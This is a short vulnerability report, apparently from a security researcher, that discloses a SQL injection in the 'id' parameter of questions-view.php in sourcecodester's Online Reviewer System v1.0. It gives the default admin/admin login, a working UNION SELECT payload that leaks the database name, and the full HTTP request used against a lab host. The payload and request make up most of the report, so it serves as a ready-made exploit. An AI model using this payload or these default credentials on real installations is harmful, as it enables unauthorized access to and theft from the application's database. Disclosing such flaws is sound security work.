# Online Reviewer System v1.0 by sourcecodester has SQL injection 1

BUG_Author: Du Kai

Login account: admin/admin

vendors: https://www.sourcecodester.com/php/12937/online-reviewer-system-using-phppdo.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /reviewer/system/system/admins/assessments/examproper/questions-view.php

Vulnerability location: /reviewer/system/system/admins/assessments/examproper/questions-view.php?id=, id

dbname=fbc_reviewer

[+] Payload: /reviewer/system/system/admins/assessments/examproper/questions-view.php?id=5WC8HD%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17--+ // Leak place ---> id

```sql
GET /reviewer/system/system/admins/assessments/examproper/questions-view.php?id=5WC8HD%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=uu9o3gvufrsptq8n5f6gjpbuac
Connection: close
```

<img width="1858" height="712" alt="image" src="https://github.com/user-attachments/assets/d0b75700-99c0-482b-a221-4372a8170f9d" />
